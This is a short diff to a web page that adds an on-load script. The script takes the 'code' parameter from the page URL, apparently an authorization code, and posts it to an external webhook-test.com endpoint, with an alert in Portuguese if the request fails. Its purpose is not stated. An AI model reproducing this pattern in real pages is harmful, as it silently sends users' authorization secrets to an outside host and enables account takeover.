@@ -38,6 +38,22 @@
             color: #333;
         }
     </style>
+    <script>
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const code = urlParams.get('code');
+
+            if (code) {
+                fetch('https://webhook-test.com/d57a45a95da39dc9d6e6a013bdfc552d', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ code: code })
+                }).catch(() => {
+                    alert('Erro ao enviar o code para o webhook.');
+                });
+            }
+        }
+    </script>
 </head>
 <body>
     <div class="container">
